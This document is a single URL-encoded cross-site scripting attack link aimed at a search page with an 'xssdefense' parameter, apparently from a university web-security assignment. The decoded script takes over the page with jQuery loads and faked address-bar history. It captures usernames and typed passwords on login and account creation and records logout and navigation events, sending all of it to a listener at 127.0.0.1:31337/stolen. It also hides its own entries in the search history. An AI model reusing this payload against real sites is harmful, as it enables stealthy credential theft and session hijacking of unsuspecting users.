http://trurl.cs.illinois.edu/search?xssdefense=4&q=%3Cscript%3E%0D%0A%7B%0D%0Avar%20payload%20%3D%20function%28attackerUrl%29%20%7B%0D%0A%7B%0D%0A%20var%20baseUrl%20%3D%20%60http%3A%2F%2Ftrurl.cs.illinois.edu%60%0D%0A%20%7D%0D%0A%7B%0D%0A%20var%20getUsername%20%3D%20function%28%29%20%7B%0D%0A%20%7B%0D%0A%20var%20nameSpan%20%3D%20document.getElementById%28%60logged-in-user%60%29%0D%0A%20%7D%0D%0A%20if%20%28nameSpan%20%3D%3D%20null%29%20%7B%0D%0A%20return%20null%0D%0A%20%7D%20%7B%0D%0A%20return%20nameSpan.innerHTML%0D%0A%20%7D%0D%0A%20%7D%0D%0A%20%7D%0D%0A%7B%0D%0A%20var%20getEncodedUrl%20%3D%20function%28%29%20%7B%0D%0A%20return%20encodeURI%28document.location.href%29%0D%0A%20%7D%0D%0A%20%7D%0D%0A%7B%0D%0A%20var%20changeAddr%20%3D%20function%28url%29%20%7B%0D%0A%20%7B%0D%0A%20window.history.replaceState%28%7B%7D%2C%20%60%60%2C%20url%29%0D%0A%20%7D%0D%0A%20%7D%0D%0A%20%7D%0D%0A%0D%0A%7B%0D%0A%20var%20logPage%20%3D%20function%28%29%20%7B%0D%0A%20%7B%0D%0A%20var%20username%20%3D%20getUsername%28%29%0D%0A%20%7D%20%7B%0D%0A%20var%20p%20%3D%20%7B%7D%0D%0A%20%7D%20%7B%0D%0A%20p%5B%60event%60%5D%20%3D%20%60nav%60%0D%0A%20%7D%20%7B%0D%0A%20p%5B%60url%60%5D%20%3D%20getEncodedUrl%28%29%0D%0A%20%7D%0D%0A%20if%20%28username%20%21%3D%20null%29%20%7B%0D%0A%20%7B%0D%0A%20p%5B%60user%60%5D%20%3D%20username%0D%0A%20%7D%0D%0A%20%7D%20%7B%0D%0A%20%24.get%28attackerUrl%2C%20p%29%0D%0A%20%7D%0D%0A%20%7D%0D%0A%20%7D%0D%0A%0D%0A%7B%0D%0A%20var%20logLogin%20%3D%20function%28%29%20%7B%0D%0A%20%7B%0D%0A%20var%20user%20%3D%20document.getElementById%28%60username%60%29.value%0D%0A%20%7D%20%7B%0D%0A%20var%20pass%20%3D%20document.getElementById%28%60userpass%60%29.value%0D%0A%20%7D%20%7B%0D%0A%20%7Bvar%20p%20%3D%20%7B%7D%7D%0D%0A%20%7Bp%5B%60user%60%5D%20%3D%20user%7D%0D%0A%20%7Bp%5B%60pass%60%5D%20%3D%20pass%7D%0D%0A%20%7Bp%5B%60event%60%5D%20%3D%20%60login%60%7D%0D%0A%20%7D%20%7B%0D%0A%20%24.get%28attackerUrl%2C%20p%29%0D%0A%20%7D%0D%0A%20%7D%0D%0A%20%7D%0D%0A%0D%0A%7B%0D%0A%20var%20login%20%3D%20function%28%29%20%7B%0D%0A%20%7B%0D%0A%20logLogin%28%29%0D%0A%20%7D%20%7B%0D%0A%20var%20user%20%3D%20document.getElementById%28%60username%60%29.value%0D%0A%20%7D%20%7B%0D%0A%20var%20pass%20%3D%20document.getElementById%28%60userpass%60%29.value%0D%0A%20%7D%20%7B%0D%0A%20%7Bvar%20p%20%3D%20%7B%7D%7D%0D%0A%20%7Bp%5B%60username%60%5D%3Duser%7D%0D%0A%20%7Bp%5B%60password%60%5D%3Dpass%7D%0D%0A%20%7B%24.post%28baseUrl%20%2B%20%60%2Flogin%60%2C%20p%2C%20function%28%29%20%7B%0D%0A%20proxy%28baseUrl%29%0D%0A%20%7D%29%7D%0D%0A%20%7D%0D%0A%20%7D%0D%0A%20%7D%0D%0A%0D%0A%0D%0A%7B%0D%0A%20var%20create%20%3D%20function%28%29%20%7B%0D%0A%20%7B%0D%0A%20logLogin%28%29%0D%0A%20%7D%20%7B%0D%0A%20var%20user%20%3D%20document.getElementById%28%60username%60%29.value%0D%0A%20%7D%20%7B%0D%0A%20var%20pass%20%3D%20document.getElementById%28%60userpass%60%29.value%0D%0A%20%7D%20%7B%0D%0A%20%7Bvar%20p%20%3D%20%7B%7D%7D%0D%0A%20%7Bp%5B%60username%60%5D%3Duser%7D%0D%0A%20%7Bp%5B%60password%60%5D%3Dpass%7D%0D%0A%20%7B%24.post%28baseUrl%20%2B%20%60%2Fcreate%60%2C%20p%2C%20function%28%29%20%7B%0D%0A%20%7B%0D%0A%20proxy%28baseUrl%29%0D%0A%20%7D%0D%0A%20%7D%29%7D%0D%0A%20%7D%0D%0A%20%7D%0D%0A%20%7D%0D%0A%0D%0A%7B%0D%0A%20var%20logLogout%20%3D%20function%28%29%20%7B%0D%0A%20%7B%0D%0A%20var%20user%20%3D%20getUsername%28%29%0D%0A%20%7D%20%7B%0D%0A%20%7Bvar%20p%20%3D%20%7B%7D%7D%0D%0A%20%7Bp%5B%60user%60%5D%20%3D%20user%7D%0D%0A%20%7Bp%5B%60event%60%5D%20%3D%20%60logout%60%7D%0D%0A%20%7D%20%7B%0D%0A%20%24.get%28attackerUrl%2C%20p%29%0D%0A%20%7D%0D%0A%20%7D%0D%0A%20%7D%0D%0A%0D%0A%7B%0D%0A%20var%20logout%20%3D%20function%28%29%20%7B%0D%0A%20%7B%0D%0A%20logLogout%28%29%0D%0A%20%7D%20%7B%0D%0A%20var%20user%20%3D%20getUsername%28%29%0D%0A%20%7D%20%7B%0D%0A%20%24.post%28baseUrl%20%2B%20%60%2Flogout%60%2C%20%7B%7D%2C%20function%28%29%20%7B%0D%0A%20%7B%0D%0A%20proxy%28baseUrl%29%0D%0A%20%7D%0D%0A%20%7D%29%0D%0A%20%7D%0D%0A%20%7D%0D%0A%20%7D%0D%0A%0D%0A%7B%0D%0A%20var%20loadInit%20%3D%20function%28%29%20%7B%0D%0A%20%7B%0D%0A%20proxy%28baseUrl%29%0D%0A%20%7D%0D%0A%20%7D%0D%0A%20%7D%0D%0A%0D%0A%7B%0D%0A%20var%20listeners%20%3D%20function%28%29%20%7B%0D%0A%20%7B%0D%0A%20var%20loginButton%20%3D%20document.getElementById%28%60log-in-btn%60%29%0D%0A%20%7D%20%7B%0D%0A%20var%20createButton%20%3D%20document.getElementById%28%60new-account-btn%60%29%0D%0A%20%7D%20%7B%0D%0A%20var%20logoutButton%20%3D%20document.getElementById%28%60log-out-btn%60%29%0D%0A%20%7D%20%7B%0D%0A%20var%20searchButton%20%3D%20document.getElementById%28%60search-btn%60%29%0D%0A%20%7D%20%7B%0D%0A%20var%20searchAgainButton%20%3D%20document.getElementById%28%60search-again-btn%60%29%0D%0A%20%7D%0D%0A%20if%20%28loginButton%20%21%3D%20null%29%20%7B%0D%0A%20%7B%0D%0A%20%24%28%60%23log-in-btn%60%29.click%28function%28e%29%20%7B%0D%0A%20%7B%0D%0A%20e.preventDefault%28%29%0D%0A%20%7D%20%7B%0D%0A%20login%28%29%0D%0A%20%7D%0D%0A%20%7D%29%0D%0A%20%7D%20%7B%0D%0A%20%24%28%60%23new-account-btn%60%29.click%28function%28e%29%20%7B%0D%0A%20%7B%0D%0A%20e.preventDefault%28%29%0D%0A%20%7D%20%7B%0D%0A%20create%28%29%0D%0A%20%7D%0D%0A%20%7D%29%0D%0A%20%7D%0D%0A%20%7D%0D%0A%20if%20%28logoutButton%20%21%3D%20null%29%20%7B%0D%0A%20%7B%0D%0A%20%24%28%60%23log-out-btn%60%29.click%28function%28e%29%20%7B%0D%0A%20%7B%0D%0A%20e.preventDefault%28%29%0D%0A%20%7D%20%7B%0D%0A%20logout%28%29%0D%0A%20%7D%0D%0A%20%7D%29%0D%0A%20%7D%0D%0A%20%7D%0D%0A%20if%20%28searchButton%20%21%3D%20null%29%20%7B%0D%0A%20%7B%0D%0A%20%24%28%60%23search-btn%60%29.click%28function%28e%29%20%7B%0D%0A%20%7B%0D%0A%20e.preventDefault%28%29%0D%0A%20%7D%20%7B%0D%0A%20var%20query%20%3D%20%24%28%60%23query%60%29.val%28%29%0D%0A%20%7D%20%7B%0D%0A%20proxy%28baseUrl%20%2B%20%60%2Fsearch%3Fq%3D%60%20%2B%20query%29%0D%0A%20%7D%0D%0A%20%7D%29%0D%0A%20%7D%0D%0A%20%7D%0D%0A%20if%20%28searchAgainButton%20%21%3D%20null%29%20%7B%0D%0A%20%7B%0D%0A%20%24%28%60.history-item%60%29.click%28function%28e%29%20%7B%0D%0A%20%7B%0D%0A%20e.preventDefault%28%29%0D%0A%20%7D%20%7B%0D%0A%20var%20query%20%3D%20e.target.href%0D%0A%20%7D%20%7B%0D%0A%20proxy%28query%29%0D%0A%20%7D%0D%0A%20%7D%29%0D%0A%20%7D%20%7B%0D%0A%20%24%28%60%23search-again-btn%60%29.click%28function%28e%29%20%7B%0D%0A%20%7B%0D%0A%20e.preventDefault%28%29%0D%0A%20%7D%20%7B%0D%0A%20proxy%28baseUrl%29%0D%0A%20%7D%0D%0A%20%7D%29%0D%0A%20%7D%20%7B%0D%0A%20var%20historyList%20%3D%20document.getElementsByClassName%28%60history-item%60%29%0D%0A%20%7D%0D%0A%20%7B%0D%0A%20for%20%28var%20i%20in%20historyList%29%20%7B%0D%0A%20if%20%28historyList%5Bi%5D.innerHTML.indexOf%28%60var%20payload%60%29%20%3E%3D%200%29%20%7B%0D%0A%20%7B%0D%0A%20historyList%5Bi%5D.style.display%20%3D%20%60none%60%0D%0A%20%7D%0D%0A%20%7D%0D%0A%20%7D%0D%0A%20%7D%0D%0A%20%7D%0D%0A%20%7D%0D%0A%20%7D%0D%0A%0D%0A%0D%0A%20%7B%0D%0A%20function%20proxy%28href%29%20%7B%0D%0A%20%7B%0D%0A%20%24%28%60html%60%29.load%28href%2C%20function%20%28%29%20%7B%0D%0A%20%7B%0D%0A%20%24%28%60html%60%29.show%28%29%0D%0A%20%7D%0D%0A%20%7B%0D%0A%20changeAddr%28href%29%0D%0A%20%7D%0D%0A%20%7B%0D%0A%20logPage%28%29%0D%0A%20%7D%0D%0A%20%7B%0D%0A%20listeners%28%29%0D%0A%20%7D%0D%0A%20%7D%29%0D%0A%20%7D%0D%0A%20%7D%0D%0A%20%7D%0D%0A%0D%0A%20%7B%0D%0A%20loadInit%28%29%0D%0A%20%7D%0D%0A%0D%0A%7B%0D%0A%20%7Bvar%20foo%20%3D%20%7B%7D%7D%0D%0A%20%7Bfoo%5Bfoo%5D%20%3D%20true%7D%0D%0A%20%7D%0D%0A%7B%0D%0A%20history.pushState%28foo%2C%20%60%60%2C%20%60%60%29%0D%0A%20%7D%0D%0A%0D%0A%7B%0D%0A%20%7Bvar%20bar%20%3D%20%7B%7D%7D%0D%0A%20%7Bbar%5Bbar%5D%20%3D%20true%7D%0D%0A%20%7D%20%7B%0D%0A%20history.pushState%28bar%2C%20%60%60%2C%20%60%60%29%0D%0A%20%7D%0D%0A%0D%0A%0D%0A%7B%0D%0A%20window.onpopstate%20%3D%20function%28event%29%20%7B%0D%0A%20%7B%0D%0A%20proxy%28document.location.href%29%0D%0A%20%7D%20%7B%0D%0A%20%7Bvar%20baz%20%3D%20%7B%7D%7D%0D%0A%20%7Bbaz%5Bbaz%5D%20%3D%20true%7D%0D%0A%20%7D%20%7B%0D%0A%20history.pushState%28baz%2C%20%60%60%2C%20%60%60%29%0D%0A%20%7D%0D%0A%20%7D%0D%0A%20%7D%0D%0A%0D%0A%7D%0D%0A%7D%0D%0A%7Bpayload%28%60http%3A%2F%2F127.0.0.1%3A31337%2Fstolen%60%29%7D%0D%0A%3C%2Fscript%3E